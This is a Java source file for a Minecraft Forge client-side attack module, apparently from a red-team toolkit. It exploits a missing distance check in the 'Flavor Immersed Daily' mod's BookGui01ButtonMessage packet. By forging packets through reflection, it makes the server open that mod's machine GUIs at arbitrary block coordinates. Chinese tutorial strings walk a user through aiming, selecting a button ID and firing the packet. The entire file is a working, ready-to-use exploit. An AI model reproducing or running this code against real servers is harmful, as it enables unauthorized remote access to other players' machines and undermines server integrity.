package com.redblue.red.modules.flavorimmerseddaily;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * FID-03: Remote GUI open (VULN-07)
 *
 * BookGui01ButtonMessage (disc=0) with buttonID 0~5 triggers Bookguito2~7Procedure.
 * These procedures call NetworkHooks.openScreen(serverPlayer, menuProvider, blockPos)
 * where blockPos comes directly from the packet's x/y/z -- no distance check.
 *
 * Opens FID-specific machine GUIs (Bookgui02~07Menu) at arbitrary positions.
 * NOTE: This opens FID menus, NOT vanilla block entity GUIs. Target must be a
 * FID machine block for the menu to show useful content.
 *
 * Bytecode confirmed: Bookguito2Procedure.execute() ->
 *   BlockPos.m_274561_(x,y,z) -> NetworkHooks.openScreen(player, new $1(blockPos), blockPos)
 */
public class FID03_RemoteGUI implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("flavor_immersed_daily", "flavor_immersed_daily");

    private static final int DISC_BOOKGUI = 0;

    private static final String[] GUI_TARGETS = {
        "buttonID=0 (Bookguito2)",
        "buttonID=1 (Bookguito5)",
        "buttonID=2 (Bookguito3)",
        "buttonID=3 (Bookguito4)",
        "buttonID=4 (Bookguito6)",
        "buttonID=5 (Bookguito7)"
    };

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("gui_target", "GUI目标", GUI_TARGETS[0], GUI_TARGETS),
        ConfigParam.ofBlock("target_pos", "目标方块坐标")
    );

    @Override public String id() { return "fid03_remote_gui"; }
    @Override public String name() { return "远程GUI打开"; }
    @Override public String description() { return "远程打开FID机器GUI(无距离校验)"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 准星对准目标FID机器方块，按K打开面板\n"
            + "2. 进入本模块，点击「准星选取」自动填入坐标\n"
            + "3. 选择GUI目标(通常buttonID=0即可，不行换其他)\n"
            + "4. 点击执行，服务端会为你打开该机器的GUI\n\n"
            + "[重要]\n"
            + "目标必须是FID模组的机器方块(炒锅/切菜板等)\n"
            + "对准普通箱子/熔炉无效(会打开空的FID菜单)\n\n"
            + "[原理]\n"
            + "BookGui01ButtonMessage buttonID 0~5\n"
            + "触发Bookguito2~7Procedure\n"
            + "直接调用NetworkHooks.openScreen(player, provider, blockPos)\n"
            + "blockPos来自数据包，无距离校验";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("flavor_immersed_daily");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        long packed = getParam("target_pos").map(ConfigParam::getLong).orElse(0L);
        if (packed == 0L) {
            chat("\u00a7c[FID03] 未选择目标坐标，请先用准星选取");
            return;
        }
        BlockPos bp = BlockPos.of(packed);

        String target = getParam("gui_target").map(ConfigParam::getString).orElse(GUI_TARGETS[0]);
        int buttonId = findButtonId(target);

        chat("\u00a7e[FID03] 发送: disc=" + DISC_BOOKGUI
            + " btn=" + buttonId
            + " pos=(" + bp.getX() + "," + bp.getY() + "," + bp.getZ() + ")"
            + " channel=" + CHANNEL);

        boolean ok = PacketForge.sendViaChannel(
            "net.mcreator.flavorimmerseddaily.FlavorImmersedDailyMod", "PACKET_HANDLER",
            "net.mcreator.flavorimmerseddaily.network.BookGui01ButtonMessage",
            new Class<?>[]{ int.class, int.class, int.class, int.class },
            new Object[]{ buttonId, bp.getX(), bp.getY(), bp.getZ() }
        );

        if (ok) {
            chat("\u00a7a[FID03] 数据包已发送(反射模式)，等待服务端响应...");
        } else {
            chat("\u00a7c[FID03] sendViaChannel 失败，检查日志");
        }
    }

    private static void chat(String msg) {
        Minecraft mc = Minecraft.getInstance();
        if (mc.player != null) {
            mc.player.displayClientMessage(Component.literal(msg), false);
        }
    }

    private int findButtonId(String target) {
        for (int i = 0; i < GUI_TARGETS.length; i++) {
            if (GUI_TARGETS[i].equals(target)) return i;
        }
        return 0;
    }
}
